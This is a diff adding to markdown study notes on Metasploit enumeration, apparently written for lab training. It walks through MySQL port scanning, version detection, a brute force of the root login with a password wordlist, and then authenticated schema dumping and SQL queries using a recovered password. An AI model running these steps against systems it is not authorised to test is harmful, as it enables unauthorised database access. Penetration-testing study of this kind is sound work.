@@ -101,6 +101,12 @@ An Auxiliary Module is a type of module within a system that includes exploits w
 
 ## Service Enumeration
 
+**Important Commands**
+- `hosts`
+- `services`
+- `loot`
+- `creds`
+
 ### FTP Enumeration
 
 FTP(File Transfer Protocol) uses TCP port 21 and is used to facilitate file sharing between a server and clients.
@@ -299,4 +305,64 @@ Additionally, important to note is the robots.txt file. The robots.txt file ist 
 
 ![image](https://github.com/user-attachments/assets/0039f3c9-ef47-44a9-a780-c3c0dc230598)
 
+
+### MySQL Enumeration
+
+MySQL is an open-source relational database management system based on SQL(Structured Query Language). It is typically used to store records, customer data, and is most commonly deployed to store web application data. MySQL utilizes TCP port 3306 by default, however, like any service it can be hosted on any open TCP port.
+
+### Practical MySQL Enumeration
+
+**Run Portscan to ensure on which port MySQL is running**
+- `service postgresql start`
+- `msfconsole`
+- `workspace -a WEB_ENUM`
+- `ifconfig`
+- `setg RHOSTS 192.248.183.3`
+- `setg RHOST 192.248.183.3`
+- `search portscan`
+- `use auxiliary/scanner/portscan/tcp`
+- `options`
+- `run` --> Port 3306 is open.
+
+**MySQL Service Version Enumeration**
+- `search type:auxiliary name:mysql`
+- `use auxiliary/scanner/mysql/mysql_version`
+- `options`
+- `run`
+
+**MySQL Bruteforce**
+- `search mysql_login`
+- `use auxiliary/scanner/mysql/mysql_login`
+- `options`
+- `set USERNAME root`
+- `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+- `set VERBOSE false`
+- `run`
+
+**Addtional MySQL Enumeration**
+- `search mysql_enum`
+- `use auxiliary/admin/mysql/mysql_enum`
+- `options`
+- `set PASSWORD twinkle`
+- `set USERNAME root`
+- `run`
+
+**MySQL SQL Module**
+- `search mysql_sql`
+- `use auxiliary/admin/mysql/mysql_sql`
+- `options`
+- `set PASSWORD twinkle`
+- `set USERNAME root`
+- `run`
+- `set SQL show databases;` To show all databases
+- `run`
+- `set SQL use videos;` select database "videos"
+
+**MySQL Schema Dump Module**
+- `search mysql_schema`
+- `use auxiliary/scanner/mysql/mysql_schemadump`
+- `options`
+- `set PASSWORD twinkle`
+- `set USERNAME root`
+- `run`
 
